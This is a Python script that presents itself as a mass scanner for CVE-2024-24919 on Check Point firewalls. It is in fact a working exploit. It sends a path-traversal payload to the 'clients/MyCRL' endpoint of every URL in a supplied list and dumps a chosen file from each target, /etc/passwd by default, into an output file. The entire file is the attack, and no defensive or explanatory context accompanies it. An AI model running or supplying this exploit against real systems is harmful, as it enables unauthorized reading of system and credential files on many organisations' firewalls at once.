import requests
import argparse
from urllib.parse import urljoin

def send_post_request(base_url, file):
    try:
        full_url = urljoin(base_url, 'clients/MyCRL')
        full_payload = "aCSHELL/../../../../../../.." + file

        headers = {
            'Content-Length': str(len(full_payload))
        }

        response = requests.post(full_url, data=full_payload, headers=headers, verify=False)

        result = {
            'url': base_url,
            'status_code': response.status_code,
            'response': response.content.decode()
        }
        
        return result
    except Exception as e:
        return {
            'url': base_url,
            'error': str(e)
        }

def scan_urls(file_path, target_file):
    results = []
    with open(file_path, 'r') as f:
        urls = f.readlines()
        for url in urls:
            url = url.strip()
            if url:
                result = send_post_request(url, target_file)
                results.append(result)
                print('Scanned:', url)
    return results

def save_results(results, output_file):
    with open(output_file, 'w') as f:
        for result in results:
            f.write(f"URL: {result['url']}\n")
            if 'error' in result:
                f.write(f"Error: {result['error']}\n")
            else:
                f.write(f"Status Code: {result['status_code']}\n")
                f.write(f"Response: {result['response']}\n")
            f.write('-' * 40 + '\n')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Mass Auto Scanner for CVE-2024-24919 on remote checkpoint firewalls.')

    parser.add_argument('-l', '--list', required=True, help='File containing a list of URLs to scan.')
    parser.add_argument('-f', '--file', default='/etc/passwd', help='The file to be dumped from the remote checkpoint servers.')
    parser.add_argument('-o', '--output', default='scan_results.txt', help='Output file to save scan results.')

    args = parser.parse_args()

    scan_results = scan_urls(args.list, args.file)
    save_results(scan_results, args.output)
    print(f"Scan complete. Results saved to {args.output}")
